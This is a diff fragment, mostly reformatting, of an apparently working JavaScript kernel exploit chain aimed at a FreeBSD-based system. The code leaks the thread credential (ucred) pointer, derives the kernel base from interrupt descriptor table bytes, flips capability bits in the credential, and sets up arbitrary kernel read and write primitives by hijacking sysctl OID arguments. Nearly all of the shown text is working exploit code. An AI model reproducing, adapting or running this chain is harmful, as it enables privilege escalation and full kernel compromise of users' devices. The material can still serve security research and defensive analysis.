+        arAd = bufAddr(arAb);
       mark(
         "PR-ARENA",
-        "nodes=" + MAXN + " bytes=0x" + (NODE_SZ * MAXN).toString(16) + " @" + arAd
+        "nodes=" +
+          MAXN +
+          " bytes=0x" +
+          (NODE_SZ * MAXN).toString(16) +
+          " @" +
+          arAd,
       );
       let lastFire = {
         n0: 0,
         fsock: -1,
         fhits: 0,
         faked: false,
-        label: "none"
+        label: "none",
       };
       const gfAb = new ArrayBuffer(RTH_SIZE);
       keepAlive2.push(gfAb);
-      const gfDv = new DataView(gfAb), gfAd = bufAddr(gfAb);
+      const gfDv = new DataView(gfAb),
+        gfAd = bufAddr(gfAb);
       const glAb = new ArrayBuffer(8);
       keepAlive2.push(glAb);
-      const glDv = new DataView(glAb), glAd = bufAddr(glAb);
+      const glDv = new DataView(glAb),
+        glAd = bufAddr(glAb);
       const firesArg = parseInt(params.get("fires") || "", 10);
-      const FIRES = Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1 ? firesArg : NUM - 1;
+      const FIRES =
+        Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1
+          ? firesArg
+          : NUM - 1;
       let fireIdx = FIRES;
       mark("PR-AMORTISE", "num=" + NUM + " fires_per_arming=" + FIRES);
       const X1 = CT1.add32(TD_UCRED_OFF);
       mark(
         "PR-PASSA-TARGET",
-        "X1 = w1.curthread+0x130 (td_ucred) = " + X1 + "  KA=" + KA + " pair=0x" + PAIR.toString(16) + " covers up to " + KA * PAIR
+        "X1 = w1.curthread+0x130 (td_ucred) = " +
+          X1 +
+          "  KA=" +
+          KA +
+          " pair=0x" +
+          PAIR.toString(16) +
+          " covers up to " +
+          KA * PAIR,
       );
       {
         let i = 0;
@@ -3611,23 +4245,31 @@
           wnode(i++, X1.add32(STEP_OFF), DUM, false);
           wnode(i++, X1, SNK, false);
         }
-        const subA = (4294967296 - KA * PAIR % 4294967296) % 4294967296;
+        const subA = (4294967296 - ((KA * PAIR) % 4294967296)) % 4294967296;
         const dA = [
           subA & 255,
-          subA >>> 8 & 255,
-          subA >>> 16 & 255,
-          subA >>> 24 & 255
+          (subA >>> 8) & 255,
+          (subA >>> 16) & 255,
+          (subA >>> 24) & 255,
         ];
         const nA = dA[0] + dA[1] + dA[2] + dA[3];
         mark(
           "PR-RESTOREA",
-          "passA subtracted " + KA * PAIR + " sub=0x" + subA.toString(16) + " digits=" + dA.join(",") + " nodes=" + nA
+          "passA subtracted " +
+            KA * PAIR +
+            " sub=0x" +
+            subA.toString(16) +
+            " digits=" +
+            dA.join(",") +
+            " nodes=" +
+            nA,
         );
         if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA))
           return;
         {
           const pa = [];
-          for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) pa.push(j);
+          for (let j = 0; j < 4; j++)
+            for (let d = 0; d < dA[j]; d++) pa.push(j);
           for (let j = 0; j < pa.length; j++)
             wnode(i++, X1.add32(pa[j]), DUM, j === pa.length - 1);
         }
@@ -3637,7 +4279,9 @@
         if (mA <= 0) {
           mark(
             "PR-PASSA-NOCROSS",
-            "no crossing: low dword either exceeds " + KA * PAIR + " or is already negative (top bit set)"
+            "no crossing: low dword either exceeds " +
+              KA * PAIR +
+              " or is already negative (top bit set)",
           );
           if (retryBenign("passA-nocross")) return;
           check("POINTER-READ", false, "pass A found no crossing");
@@ -3646,37 +4290,48 @@
         var kA = KA - mA + 1;
         mark(
           "PR-PASSA",
-          "m=" + mA + " -> k=" + kA + "  W0 in (" + (kA - 1) * PAIR + ", " + kA * PAIR + "]"
+          "m=" +
+            mA +
+            " -> k=" +
+            kA +
+            "  W0 in (" +
+            (kA - 1) * PAIR +
+            ", " +
+            kA * PAIR +
+            "]",
         );
       }
       const RED = (kA - 1) * PAIR;
       const dga = [
         RED & 255,
-        RED >>> 8 & 255,
-        RED >>> 16 & 255,
-        RED >>> 24 & 255
+        (RED >>> 8) & 255,
+        (RED >>> 16) & 255,
+        (RED >>> 24) & 255,
       ];
       const nDga = dga[0] + dga[1] + dga[2] + dga[3];
       mark(
         "PR-RESTORE-PLAN",
-        "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga
+        "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga,
       );
-      if (!check(
-        "pr-restore-bounded",
-        nDga > 0 && nDga <= 1020 && RED > 0,
-        "n=" + nDga
-      ))
+      if (
+        !check(
+          "pr-restore-bounded",
+          nDga > 0 && nDga <= 1020 && RED > 0,
+          "n=" + nDga,
+        )
+      )
         return;
       const X2 = X1;
       mark(
         "PR-PASSB-TARGET",
-        "x2=" + X2 + " same_copy=1 restore_digits=" + nDga + " probes=" + KB
+        "x2=" + X2 + " same_copy=1 restore_digits=" + nDga + " probes=" + KB,
       );
       let W0 = 0;
       {
         let i = 0;
         const posA3 = [];
-        for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) posA3.push(j);
+        for (let j = 0; j < 4; j++)
+          for (let d = 0; d < dga[j]; d++) posA3.push(j);
         for (let j = 0; j < posA3.length; j++)
           wnode(i++, X2.add32(posA3[j]), DUM, false);
         for (let j = 0; j < KB; j++) wnode(i++, X2, SNK, false);
@@ -3684,26 +4339,36 @@
         const subB = (4294967296 - totB) % 4294967296;
         const dB = [
           subB & 255,
-          subB >>> 8 & 255,
-          subB >>> 16 & 255,
-          subB >>> 24 & 255
+          (subB >>> 8) & 255,
+          (subB >>> 16) & 255,
+          (subB >>> 24) & 255,
         ];
         const nB = dB[0] + dB[1] + dB[2] + dB[3];
         mark(
           "PR-RESTOREB",
-          "passB subtracted " + totB + " sub=0x" + subB.toString(16) + " digits=" + dB.join(",") + " nodes=" + nB
+          "passB subtracted " +
+            totB +
+            " sub=0x" +
+            subB.toString(16) +
+            " digits=" +
+            dB.join(",") +
+            " nodes=" +
+            nB,
         );
-        if (!check(
-          "pr-restoreb-bounded",
-          nB >= 1 && nB <= 1020,
-          "n=" + nB + " min=1 max=1020 unterminated_if=0"
-        )) {
+        if (
+          !check(
+            "pr-restoreb-bounded",
+            nB >= 1 && nB <= 1020,
+            "n=" + nB + " min=1 max=1020 unterminated_if=0",
+          )
+        ) {
           mark("REFUSING-TO-ARM", "reason=passb-restore-empty");
           return;
         }
         {
           const pb = [];
-          for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) pb.push(j);
+          for (let j = 0; j < 4; j++)
+            for (let d = 0; d < dB[j]; d++) pb.push(j);
           for (let j = 0; j < pb.length; j++)
             wnode(i++, X2.add32(pb[j]), DUM, j === pb.length - 1);
         }
@@ -3713,7 +4378,7 @@
         if (mB <= 0) {
           mark(
             "PR-PASSB-NOCROSS",
-            "remainder never crossed -- k may be off by one, or the two threads' td_proc differ"
+            "remainder never crossed -- k may be off by one, or the two threads' td_proc differ",
           );
           if (retryBenign("passB-nocross")) return;
           check("POINTER-READ", false, "pass B found no crossing");
@@ -3723,25 +4388,42 @@
         W0 = (kA - 1) * PAIR + R;
         mark(
           "PR-PASSB",
-          "m=" + mB + " -> R=" + R + "  => low dword = " + W0 + " (0x" + (W0 >>> 0).toString(16) + ")"
+          "m=" +
+            mB +
+            " -> R=" +
+            R +
+            "  => low dword = " +
+            W0 +
+            " (0x" +
+            (W0 >>> 0).toString(16) +
+            ")",
         );
       }
       const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
       mark(
         "PR-UCRED",
-        "ucred = " + UCRED + "  (high dword taken from the leaked curthread prefix 0x" + (CT1.hi >>> 0).toString(16) + ")"
+        "ucred = " +
+          UCRED +
+          "  (high dword taken from the leaked curthread prefix 0x" +
+          (CT1.hi >>> 0).toString(16) +
+          ")",
       );
       check(
         "pointer-read-shape-ok",
-        W0 >>> 0 !== 0 && (W0 >>> 0 & 7) === 0,
-        "low=0x" + (W0 >>> 0).toString(16) + " 8-byte aligned=" + ((W0 >>> 0 & 7) === 0)
+        W0 >>> 0 !== 0 && ((W0 >>> 0) & 7) === 0,
+        "low=0x" +
+          (W0 >>> 0).toString(16) +
+          " 8-byte aligned=" +
+          (((W0 >>> 0) & 7) === 0),
       );
       clearRetry();
       const IDT = new int64(6656, 4294967168);
       const GATE_SZ = 16;
       const RVA_RSVD = off.k_idt_rsvd;
       const STEPMAG = 16777216;
-      const SWEEP = params.get("sweep") ? parseInt(params.get("sweep"), 10) : 256;
+      const SWEEP = params.get("sweep")
+        ? parseInt(params.get("sweep"), 10)
+        : 256;
       const B = {};
       const JOBS = [
         {
@@ -3749,109 +4431,138 @@
           j: 0,
           g: 22,
           want: null,
-          low: function() {
+          low: function () {
             return 0;
-          }
+          },
         },
         {
           n: "b1",
           j: 1,
           g: 24,
           want: null,
-          low: function() {
-            return B.b0 << 16 >>> 0;
-          }
+          low: function () {
+            return (B.b0 << 16) >>> 0;
+          },
         },
         {
           n: "b3",
           j: 3,
           g: 25,
           want: 0,
-          low: function() {
-            return (32 << 16 | B.b1 << 8 | B.b0) >>> 0;
-          }
+          low: function () {
+            return ((32 << 16) | (B.b1 << 8) | B.b0) >>> 0;
+          },
         },
         {
           n: "b5",
           j: 5,
           g: 26,
           want: 142,
-          low: function() {
+          low: function () {
             return 32;
-          }
+          },
         },
         {
           n: "b6",
           j: 6,
           g: 27,
           want: null,
-          low: function() {
+          low: function () {
             return 9306112;
-          }
+          },
         },
         {
           n: "b7",
           j: 7,
           g: 31,
           want: null,
-          low: function() {
-            return (B.b6 << 16 | 36352) >>> 0;
-          }
+          low: function () {
+            return ((B.b6 << 16) | 36352) >>> 0;
+          },
         },
         {
           n: "b6d",
           j: 6,
           g: 20,
           want: null,
-          low: function() {
+          low: function () {
             return 9306112;
-          }
+          },
         },
         {
           n: "b7d",
           j: 7,
           g: 15,
           want: null,
-          low: function() {
-            return (B.b6 << 16 | 36352) >>> 0;
-          }
-        }
+          low: function () {
+            return ((B.b6 << 16) | 36352) >>> 0;
+          },
+        },
       ];
-      const NJ = JOBS.length, NEED = NJ * SWEEP * 2;
+      const NJ = JOBS.length,
+        NEED = NJ * SWEEP * 2;
       mark(
         "ANCHOR-PLAN",
-        "idt=" + IDT + " rsvd_rva=0x" + RVA_RSVD.toString(16) + " jobs=" + NJ + " sweep=" + SWEEP + " nodes=" + NEED + " gates=" + JOBS.map(function(q) {
-          return q.g;
-        }).join(",") + " armings_so_far=" + armCount
+        "idt=" +
+          IDT +
+          " rsvd_rva=0x" +
+          RVA_RSVD.toString(16) +
+          " jobs=" +
+          NJ +
+          " sweep=" +
+          SWEEP +
+          " nodes=" +
+          NEED +
+          " gates=" +
+          JOBS.map(function (q) {
+            return q.g;
+          }).join(",") +
+          " armings_so_far=" +
+          armCount,
       );
-      if (!check(
-        "anchor-nodes-bounded",
-        NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
-        "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP
-      ))
+      if (
+        !check(
+          "anchor-nodes-bounded",
+          NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
+          "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP,
+        )
+      )
         return;
       {
-        let lo = 16777216, hi = -1;
+        let lo = 16777216,
+          hi = -1;
         for (let q = 0; q < NJ; q++) {
           const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
           if (o - 3 < lo) lo = o - 3;
           if (o + 3 > hi) hi = o + 3;
         }
-        if (!check(
-          "anchor-inside-idt",
-          lo >= 0 && hi < 4096,
-          "lo=+0x" + lo.toString(16) + " hi=+0x" + hi.toString(16) + " limit=0x1000"
-        ))
+        if (
+          !check(
+            "anchor-inside-idt",
+            lo >= 0 && hi < 4096,
+            "lo=+0x" +
+              lo.toString(16) +
+              " hi=+0x" +
+              hi.toString(16) +
+              " limit=0x1000",
+          )
+        )
           return;
         mark(
           "ANCHOR-SPAN",
-          "from=" + IDT.add32(lo) + " to=" + IDT.add32(hi) + " gates=15,20-27,31 reserved=1"
+          "from=" +
+            IDT.add32(lo) +
+            " to=" +
+            IDT.add32(hi) +
+            " gates=15,20-27,31 reserved=1",
         );
       }
       const anAb = new ArrayBuffer(4 * NJ * SWEEP);
       keepAlive2.push(anAb);
-      const anDv = new DataView(anAb), anAd = bufAddr(anAb);
-      for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 1073741824, true);
+      const anDv = new DataView(anAb),
+        anAd = bufAddr(anAb);
+      for (let i = 0; i < NJ * SWEEP; i++)
+        anDv.setInt32(i * 4, 1073741824, true);
       {
         let idx = 0;
         for (let q = 0; q < NJ; q++) {
@@ -3870,7 +4581,9 @@
       let bad = 0;
       for (let q = 0; q < NJ; q++) {
         const J = JOBS[q];
-        let obs = "", ones = 0, edge = -1;
+        let obs = "",
+          ones = 0,
+          edge = -1;
         for (let k = 0; k < SWEEP; k++) {
           const f = 1073741824 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0;
           obs += f ? "1" : "0";
@@ -3884,42 +4597,96 @@
         if (d.b < 0 || d.n !== 1) bad++;
         mark(
           "ANCHOR-BYTE",
-          J.n + " gate=" + J.g + " j=" + J.j + " low=0x" + low.toString(16) + " ones=" + ones + " edge=" + edge + " cands=" + d.n + " val=" + (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16))
+          J.n +
+            " gate=" +
+            J.g +
+            " j=" +
+            J.j +
+            " low=0x" +
+            low.toString(16) +
+            " ones=" +
+            ones +
+            " edge=" +
+            edge +
+            " cands=" +
+            d.n +
+            " val=" +
+            (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)),
         );
         if (J.want !== null)
           check(
             "anchor-control-" + J.n,
             d.b === J.want,
-            "want=0x" + J.want.toString(16) + " got=" + (d.b < 0 ? "none" : "0x" + d.b.toString(16))
+            "want=0x" +
+              J.want.toString(16) +
+              " got=" +
+              (d.b < 0 ? "none" : "0x" + d.b.toString(16)),
           );
       }
-      if (!check(
-        "anchor-every-byte-unique",
-        bad === 0,
-        "nomatch=" + bad + " jobs=" + NJ
-      ))
+      if (
+        !check(
+          "anchor-every-byte-unique",
+          bad === 0,
+          "nomatch=" + bad + " jobs=" + NJ,
+        )
+      )
         return;
       check(
         "anchor-duplicates-agree",
         B.b6 === B.b6d && B.b7 === B.b7d,
-        "b6=0x" + B.b6.toString(16) + " b6d=0x" + B.b6d.toString(16) + " b7=0x" + B.b7.toString(16) + " b7d=0x" + B.b7d.toString(16)
+        "b6=0x" +
+          B.b6.toString(16) +
+          " b6d=0x" +
+          B.b6d.toString(16) +
+          " b7=0x" +
+          B.b7.toString(16) +
+          " b7d=0x" +
+          B.b7d.toString(16),
       );
-      const handlerLo = (B.b7 << 24 >>> 0) + (B.b6 << 16 >>> 0) + (B.b1 << 8) + B.b0 >>> 0;
-      const kbLo = handlerLo - RVA_RSVD >>> 0;
+      const handlerLo =
+        (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>>
+        0;
+      const kbLo = (handlerLo - RVA_RSVD) >>> 0;
       const KBASE = new int64(kbLo, 4294967295);
       mark(
         "ANCHOR-HANDLER",
-        "handler=0xffffffff" + handlerLo.toString(16).padStart(8, "0") + " rva=0x" + RVA_RSVD.toString(16) + " b7=0x" + B.b7.toString(16) + " b6=0x" + B.b6.toString(16) + " b1=0x" + B.b1.toString(16) + " b0=0x" + B.b0.toString(16)
+        "handler=0xffffffff" +
+          handlerLo.toString(16).padStart(8, "0") +
+          " rva=0x" +
+          RVA_RSVD.toString(16) +
+          " b7=0x" +
+          B.b7.toString(16) +
+          " b6=0x" +
+          B.b6.toString(16) +
+          " b1=0x" +
+          B.b1.toString(16) +
+          " b0=0x" +
+          B.b0.toString(16),
       );
       const kbAligned = (kbLo & 16383) === 0;
       check(
         "ANCHOR-KERNEL-BASE",
         kbAligned,
-        "kernel_base=" + KBASE + " aligned0x4000=" + (kbAligned ? 1 : 0) + " low=0x" + kbLo.toString(16)
+        "kernel_base=" +
+          KBASE +
+          " aligned0x4000=" +
+          (kbAligned ? 1 : 0) +
+          " low=0x" +
+          kbLo.toString(16),
       );
       mark(
         "ANCHOR-VERDICT",
-        "fw=" + fwKey + " kernel_base=" + KBASE + " armings=" + armCount + " curthread=" + CT1 + " verdict=" + (kbAligned ? "ANCHORED" : "REJECTED") + (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned")
+        "fw=" +
+          fwKey +
+          " kernel_base=" +
+          KBASE +
+          " armings=" +
+          armCount +
+          " curthread=" +
+          CT1 +
+          " verdict=" +
+          (kbAligned ? "ANCHORED" : "REJECTED") +
+          (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"),
       );
       if (!kbAligned) {
         allDone = true;
@@ -3933,7 +4700,14 @@
       const ONUM_N = params.get("onum") ? parseInt(params.get("onum"), 10) : 64;
       mark(
         "KF-TARGETS",
-        "oid=" + OID + " oid_number=" + O_NUM + " vis=" + O_VIS + " ran=" + O_RAN
+        "oid=" +
+          OID +
+          " oid_number=" +
+          O_NUM +
+          " vis=" +
+          O_VIS +
+          " ran=" +
+          O_RAN,
       );
       const CAPS_B = UCRED.add32(103);
       const CAPS_PR = UCRED.add32(100);
@@ -3941,30 +4715,57 @@
       const CAPS_RESTORE = params.get("caprestore") === "1";
       mark(
         "CAPS-TARGET",
-        "ucred=" + UCRED + " caps0=" + UCRED.add32(96) + " byte=" + CAPS_B + " probe=" + CAPS_PR + " want_bit=62 target=0x" + CAPS_TARGET.toString(16)
+        "ucred=" +
+          UCRED +
+          " caps0=" +
+          UCRED.add32(96) +
+          " byte=" +
+          CAPS_B +
+          " probe=" +
+          CAPS_PR +
+          " want_bit=62 target=0x" +
+          CAPS_TARGET.toString(16),
       );
       const mf1 = multiFire(
         [
           { kind: "sweep", step: CAPS_B, probe: CAPS_PR, low: 0 },
-          { kind: "oracle", addr: O_NUM, n: ONUM_N }
+          { kind: "oracle", addr: O_NUM, n: ONUM_N },
         ],
-        "caps-byte+oid_number"
+        "caps-byte+oid_number",
       );
       if (mf1 === null) return;
-      const cb = mf1[0], on = mf1[1];
-      const bLo = cb.b - 1 & 255, bHi = cb.b;
-      const setLo = (bLo & 64) !== 0, setHi = (bHi & 64) !== 0;
+      const cb = mf1[0],
+        on = mf1[1];
+      const bLo = (cb.b - 1) & 255,
+        bHi = cb.b;
+      const setLo = (bLo & 64) !== 0,
+        setHi = (bHi & 64) !== 0;
       mark(
         "CAPS-BYTE",
-        "b=" + (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) + " cands=" + cb.n + " true_in={0x" + bLo.toString(16) + ",0x" + bHi.toString(16) + "} bit62_lo=" + (setLo ? 1 : 0) + " bit62_hi=" + (setHi ? 1 : 0)
+        "b=" +
+          (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) +
+          " cands=" +
+          cb.n +
+          " true_in={0x" +
+          bLo.toString(16) +
+          ",0x" +
+          bHi.toString(16) +
+          "} bit62_lo=" +
+          (setLo ? 1 : 0) +
+          " bit62_hi=" +
+          (setHi ? 1 : 0),
       );
-      if (!check(
-        "caps-byte-decoded",
-        cb.b >= 0 && cb.n === 1,
-        "b=" + cb.b + " cands=" + cb.n
-      ))
+      if (
+        !check(
+          "caps-byte-decoded",
+          cb.b >= 0 && cb.n === 1,
+          "b=" + cb.b + " cands=" + cb.n,
+        )
+      )
         return;
-      let capsWrote = 0, capsSkip = "", capsPend = 0;
+      let capsWrote = 0,
+        capsSkip = "",
+        capsPend = 0;
       if (setLo && setHi) {
         capsSkip = "already-set";
         mark("CAPS-SKIP", "bit62 set for both candidates -- no write");
@@ -3972,31 +4773,44 @@
         capsSkip = "opted-out";
         mark("CAPS-SKIP", "?nocaps=1 -- read-only, gate 2 stays closed");
       } else {
-        const dN = bHi + 1 & 255;
+        const dN = (bHi + 1) & 255;
         const fin = [
-          bHi - dN & 255,
-          bLo - dN & 255,
-          bHi - dN - 1 & 255,
-          bLo - dN - 1 & 255
+          (bHi - dN) & 255,
+          (bLo - dN) & 255,
+          (bHi - dN - 1) & 255,
+          (bLo - dN - 1) & 255,
         ];
-        const allSet = fin.every(function(v) {
+        const allSet = fin.every(function (v) {
           return (v & 64) !== 0;
         });
         mark(
           "CAPS-PLAN",
-          "decrement " + CAPS_B + " by " + dN + " -> final in {" + fin.map(function(v) {
-            return "0x" + v.toString(16);
-          }).join(",") + "} all_bit62=" + (allSet ? 1 : 0) + " wraps=1"
+          "decrement " +
+            CAPS_B +
+            " by " +
+            dN +
+            " -> final in {" +
+            fin
+              .map(function (v) {
+                return "0x" + v.toString(16);
+              })
+              .join(",") +
+            "} all_bit62=" +
+            (allSet ? 1 : 0) +
+            " wraps=1",
         );
-        if (!check(
-          "caps-plan-ok",
-          dN > 0 && dN <= 256 && allSet,
-          "n=" + dN + " finals=" + fin.join(",")
-        ))
+        if (
+          !check(
+            "caps-plan-ok",
+            dN > 0 && dN <= 256 && allSet,
+            "n=" + dN + " finals=" + fin.join(","),
+          )
+        )
           return;
         capsPend = dN;
       }
-      const IPV6_TCLASS = 61, KF_MARK = 65;
+      const IPV6_TCLASS = 61,
+        KF_MARK = 65;
       const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
       if (kfSock >= 0) {
         opened.push(kfSock);
@@ -4006,51 +4820,81 @@
         tDv.setInt32(0, KF_MARK, true);
         sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
       }
-      if (!check(
-        "kf-target-socket",
-        kfSock >= 0,
-        "fd=" + kfSock + " tclass=0x" + KF_MARK.toString(16)
-      ))
+      if (
+        !check(
+          "kf-target-socket",
+          kfSock >= 0,
+          "fd=" + kfSock + " tclass=0x" + KF_MARK.toString(16),
+        )
+      )
         return;
       const mibAb = new ArrayBuffer(8);
       keepAlive2.push(mibAb);
-      const mibDv = new DataView(mibAb), mibAd = bufAddr(mibAb);
+      const mibDv = new DataView(mibAb),
+        mibAd = bufAddr(mibAb);
       mibDv.setInt32(0, 1, true);
       mibDv.setInt32(4, KERN_FILE_NUM, true);
       const KF_BYTES = 1 << 20;
       const kfAb = new ArrayBuffer(KF_BYTES);
       keepAlive2.push(kfAb);
-      const kfDv = new DataView(kfAb), kfAd = bufAddr(kfAb);
+      const kfDv = new DataView(kfAb),
+        kfAd = bufAddr(kfAb);
       const olAb = new ArrayBuffer(8);
       keepAlive2.push(olAb);
-      const olDv = new DataView(olAb), olAd = bufAddr(olAb);
+      const olDv = new DataView(olAb),
+        olAd = bufAddr(olAb);
       const base0 = kernFile(false, "baseline");
       check(
         "kf-baseline-is-enoent",
         base0.rv < 0 && base0.err === 2,
-        "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2"
+        "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2",
       );
       mark(
         "KF-OIDNUM",
-        "addr=" + O_NUM + " n=" + ONUM_N + " m=" + on.m + " v=" + on.v + " want=" + KERN_FILE_NUM
+        "addr=" +
+          O_NUM +
+          " n=" +
+          ONUM_N +
+          " m=" +
+          on.m +
+          " v=" +
+          on.v +
+          " want=" +
+          KERN_FILE_NUM,
       );
-      if (!check(
-        "KF-ANCHOR-CONFIRMED",
-        on.v === KERN_FILE_NUM,
-        "oid_number=" + on.v + " want=" + KERN_FILE_NUM + " kernel_base=" + KBASE
-      ))
+      if (
+        !check(
+          "KF-ANCHOR-CONFIRMED",
+          on.v === KERN_FILE_NUM,
+          "oid_number=" +
+            on.v +
+            " want=" +
+            KERN_FILE_NUM +
+            " kernel_base=" +
+            KBASE,
+        )
+      )
         return;
-      const curNum = KERN_FILE_NUM - ONUM_N >>> 0;
-      const pNum = planSub(curNum, curNum - KERN_FILE_NUM >>> 0);
+      const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0;
+      const pNum = planSub(curNum, (curNum - KERN_FILE_NUM) >>> 0);
       mark(
         "KF-RESTORE-PLAN",
-        "cur=0x" + curNum.toString(16) + " digits=" + pNum.d.join(",") + " nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0)
+        "cur=0x" +
+          curNum.toString(16) +
+          " digits=" +
+          pNum.d.join(",") +
+          " nodes=" +
+          pNum.n +
+          " clean=" +
+          (pNum.clean ? 1 : 0),
       );
-      if (!check(
-        "kf-restore-clean",
-        pNum.clean && pNum.n <= 1020,
-        "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0)
-      ))
+      if (
+        !check(
+          "kf-restore-clean",
+          pNum.clean && pNum.n <= 1020,
+          "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0),
+        )
+      )
         return;
       {
         let i = emitSub(O_NUM, 0, pNum);
@@ -4059,7 +4903,12 @@
         put(arDv, (i - 1) * NODE_SZ + 48, 0);
         mark(
           "KF-WRITE",
-          "restore_oid_number=" + pNum.n + " unhide=1 caps=" + capsPend + " total=" + i
+          "restore_oid_number=" +
+            pNum.n +
+            " unhide=1 caps=" +
+            capsPend +
+            " total=" +
+            i,
         );
         if (runChain(i, "restore+unhide+caps") === null) return;
         if (!fireOk("restore+unhide+caps")) {
@@ -4067,7 +4916,7 @@
             capsWrote = capsPend;
             mark(
               "CAPS-WROTE-UNVERIFIED",
-              "caps=" + capsPend + " f_socket=" + lastFire.fsock
+              "caps=" + capsPend + " f_socket=" + lastFire.fsock,
             );
           }
           return;
@@ -4086,20 +4935,41 @@
       const B_ARG1 = B_OID.add32(24);
       mark(
         "KRW-OIDS",
-        "A(1,27)=" + A_OID + " A2(1,28)=" + A2_OID + " B(1,7)=" + B_OID + " &B.arg1=" + B_ARG1 + " capsLive=" + (capsLive ? 1 : 0)
+        "A(1,27)=" +
+          A_OID +
+          " A2(1,28)=" +
+          A2_OID +
+          " B(1,7)=" +
+          B_OID +
+          " &B.arg1=" +
+          B_ARG1 +
+          " capsLive=" +
+          (capsLive ? 1 : 0),
       );
       const posA = planLow(A_ARG1_CUR, B_ARG1);
       const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
       mark(
         "KRW-PLAN",
-        "posA=" + (posA ? posA.length : "REFUSED") + " posA2=" + (posA2 ? posA2.length : "REFUSED")
+        "posA=" +
+          (posA ? posA.length : "REFUSED") +
+          " posA2=" +
+          (posA2 ? posA2.length : "REFUSED"),
       );
       const planOk = capsLive && !!posA && !!posA2;
-      if (!check(
-        "krw-plan-ok",
-        planOk,
-        planOk ? "" : "capsLive=" + (capsLive ? 1 : 0) + " posA=" + (posA ? posA.length : "null") + " posA2=" + (posA2 ? posA2.length : "null")
-      )) {
+      if (
+        !check(
+          "krw-plan-ok",
+          planOk,
+          planOk
+            ? ""
+            : "capsLive=" +
+                (capsLive ? 1 : 0) +
+                " posA=" +
+                (posA ? posA.length : "null") +
+                " posA2=" +
+                (posA2 ? posA2.length : "null"),
+        )
+      ) {
         allDone = true;
       } else {
         {
@@ -4114,7 +4984,13 @@
           put(arDv, (i - 1) * NODE_SZ + 48, 0);
           mark(
             "KRW-FIRE",
-            "nodes=" + i + " (3 unhide + " + posA.length + " A + " + posA2.length + " A2)"
+            "nodes=" +
+              i +
+              " (3 unhide + " +
+              posA.length +
+              " A + " +
+              posA2.length +
+              " A2)",
           );
           if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
             allDone = true;
@@ -4123,52 +4999,64 @@
           } else if (!fireOk("krw-setup")) {
             allDone = true;
           } else {
-            let kMib = function(a, b) {
-              kmDv.setInt32(0, a, true);
-              kmDv.setInt32(4, b, true);
-            }, kSysRead = function(a, b) {
-              kMib(a, b);
-              klDv.setInt32(0, 4, true);
-              klDv.setInt32(4, 0, true);
-              koDv.setInt32(0, 0, true);
-              const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
-              const er = r < 0 ? errno() : 0;
-              const vl = koDv.getInt32(0, true);
-              return { rv: r, err: er, val: vl };
-            }, kSysWrite = function(a, b, v) {
-              kMib(a, b);
-              knDv.setInt32(0, v | 0, true);
-              const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
-              const er = r < 0 ? errno() : 0;
-              return { rv: r, err: er };
-            }, steer = function(X) {
-              kSysWrite(1, 27, X.low | 0);
-              kSysWrite(1, 28, X.hi | 0);
-            }, kread32 = function(X) {
-              steer(X);
-              return kSysRead(1, 7).val >>> 0;
-            }, kwrite32 = function(X, v) {
-              steer(X);
-              return kSysWrite(1, 7, v | 0).rv;
-            }, read82 = function(X) {
-              const lo = kread32(X), hi = kread32(X.add32(4));
-              return new int64(lo >>> 0, hi >>> 0);
-            }, write82 = function(X, V) {
-              kwrite32(X, V.low | 0);
-              kwrite32(X.add32(4), V.hi | 0);
-            };
+            let kMib = function (a, b) {
+                kmDv.setInt32(0, a, true);
+                kmDv.setInt32(4, b, true);
+              },
+              kSysRead = function (a, b) {
+                kMib(a, b);
+                klDv.setInt32(0, 4, true);
+                klDv.setInt32(4, 0, true);
+                koDv.setInt32(0, 0, true);
+                const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
+                const er = r < 0 ? errno() : 0;
+                const vl = koDv.getInt32(0, true);
+                return { rv: r, err: er, val: vl };
+              },
+              kSysWrite = function (a, b, v) {
+                kMib(a, b);
+                knDv.setInt32(0, v | 0, true);
+                const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
+                const er = r < 0 ? errno() : 0;
+                return { rv: r, err: er };
+              },
+              steer = function (X) {
+                kSysWrite(1, 27, X.low | 0);
+                kSysWrite(1, 28, X.hi | 0);
+              },
+              kread32 = function (X) {
+                steer(X);
+                return kSysRead(1, 7).val >>> 0;
+              },
+              kwrite32 = function (X, v) {
+                steer(X);
+                return kSysWrite(1, 7, v | 0).rv;
+              },
